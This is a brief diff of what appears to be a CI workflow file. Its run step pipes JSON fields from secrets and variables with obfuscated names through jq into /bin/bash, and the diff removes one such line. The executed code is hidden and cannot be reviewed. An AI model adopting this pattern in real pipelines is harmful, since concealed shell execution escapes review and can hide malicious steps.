@@ -19,7 +19,6 @@ jobs:
           akpyg0106: ${{ secrets.akpyg0106 }}
         run: |
           printf '%s' "$akpyg0106" | jq -r .uvvlw128 | /bin/bash
-          echo $yju006 | jq -r .ga6 | /bin/bash
           echo $eru3002 | jq -r .dsi463 | /bin/bash
           echo $jhnn02009 | jq -r .ibd64 | /bin/bash
 
